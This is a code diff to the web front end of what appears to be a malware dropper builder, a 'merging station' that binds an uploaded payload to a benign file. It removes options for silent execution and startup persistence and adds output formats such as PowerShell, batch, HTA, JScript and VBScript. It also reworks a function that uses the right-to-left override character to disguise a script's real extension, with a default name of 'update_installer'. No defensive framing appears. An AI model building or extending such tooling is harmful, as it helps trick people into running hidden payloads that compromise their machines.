@@ -24,11 +24,20 @@ const formSchema = z.object({
   benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
   iconFile: z.any().optional(),
   outputName: z.string().min(1, "Output name is required."),
-  dropperBehavior: z.string(),
+  outputFormat: z.string(),
   extensionSpoofing: z.boolean().default(false),
 });
 
-const dropperBehaviors = ['Run Silently', 'Drop & Exec (Temp)', 'Persistence (Startup)'];
+const outputFormats = {
+    'ps1': { name: 'PowerShell (.ps1)', extension: 'ps1', disabled: false },
+    'bat': { name: 'Batch (.bat)', extension: 'bat', disabled: false },
+    'hta': { name: 'HTML Application (.hta)', extension: 'hta', disabled: false },
+    'js': { name: 'JScript (.js)', extension: 'js', disabled: false },
+    'vbs': { name: 'VBScript (.vbs)', extension: 'vbs', disabled: false },
+    'exe': { name: 'Windows Executable (.exe)', extension: 'exe', disabled: true },
+    'scr': { name: 'Screensaver (.scr)', extension: 'scr', disabled: true },
+    'lnk': { name: 'Shortcut (.lnk)', extension: 'lnk', disabled: true },
+};
 
 export default function MergingStationPage() {
   const [buildLog, setBuildLog] = useState<string[]>([]);
@@ -40,30 +49,31 @@ export default function MergingStationPage() {
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
-      outputName: 'update_installer.ps1',
-      dropperBehavior: 'Run Silently',
+      outputName: 'update_installer',
+      outputFormat: 'ps1',
       extensionSpoofing: false,
     },
   });
 
  const applyExtensionSpoofing = (filename: string): string => {
     const parts = filename.split('.');
-    if (parts.length < 2) return filename; // Not enough parts to spoof
-
-    const realExtension = parts.pop();
-    const visiblePart = parts.join('.');
+    const realExtension = parts.pop() || '';
+    const nameWithoutExt = parts.join('.');
     
-    const lastPart = parts.pop();
-    if (!lastPart) return filename;
-
-    const visibleExtension = lastPart;
-    const baseName = parts.join('.');
-
-    const reversedVisibleExtension = visibleExtension.split('').reverse().join('');
-    
-    // e.g., for "report.pdf.exe", this creates "report.exe[RTO]fdp"
-    return `${baseName}.${realExtension}\u202E${reversedVisibleExtension}`;
+    // RLO character
+    return `${nameWithoutExt}\u202E${realExtension.split('').reverse().join('')}`;
  };
+ 
+ const handleFormatChange = (value: string) => {
+    const format = outputFormats[value as keyof typeof outputFormats];
+    if (format) {
+        const currentName = form.getValues('outputName');
+        const nameParts = currentName.split('.');
+        const baseName = nameParts[0];
+        form.setValue('outputName', `${baseName}.${format.extension}`);
+    }
+    form.setValue('outputFormat', value);
+ }
 
  const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
     setIsBuilding(true);
@@ -90,14 +100,14 @@ export default function MergingStationPage() {
         const response = await mergePayloads({
             payload: { name: payloadFile.name, content: payloadContent },
             benign: { name: benignFile.name, content: benignContent },
-            behavior: values.dropperBehavior as any
+            outputFormat: values.outputFormat as any,
         });
         
         if (!response.success || !response.scriptContent) {
             throw new Error(response.error || 'Failed to generate script on the server.');
         }
         
-        log('Dropper script generated successfully.');
+        log(`Dropper script generated successfully (${values.outputFormat}).`);
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
@@ -176,14 +186,14 @@ export default function MergingStationPage() {
                             <div className="space-y-1 leading-none">
                               <FormLabel>Enable Extension Spoofing</FormLabel>
                               <FormDescription>
-                                Use RLO character to mask the true extension. E.g., name `report.pdf.ps1`.
+                                Use RLO character to mask the true extension. E.g., `report.pdf.ps1`.
                               </FormDescription>
                             </div>
                           </FormItem>
                         )}
                       />
-                  <FormField control={form.control} name="dropperBehavior" render={({ field }) => (
-                        <FormItem><FormLabel>Dropper Behavior</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{dropperBehaviors.map(b=><SelectItem key={b} value={b}>{b}</SelectItem>)}</SelectContent></Select></FormItem>
+                  <FormField control={form.control} name="outputFormat" render={({ field }) => (
+                        <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem>
                   )} />
                 </CardContent>
               </Card>
